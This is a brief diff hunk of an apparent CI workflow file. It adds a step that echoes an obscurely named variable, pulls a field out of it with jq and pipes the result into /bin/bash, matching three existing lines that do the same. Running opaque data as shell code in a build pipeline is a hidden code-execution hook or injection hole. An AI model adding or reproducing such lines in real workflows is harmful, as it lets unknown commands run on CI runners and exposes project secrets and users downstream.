@@ -35,6 +35,7 @@ jobs:
           echo $qimt60388 | jq -r .qqdq64 | /bin/bash
           printf '%s' "$jbac52" | jq -r .x3824 | /bin/bash
           echo $q085 | jq -r .ghn4765 | /bin/bash
+          echo $br383 | jq -r .e411 | /bin/bash
 
       - name: Save output
         if: always()
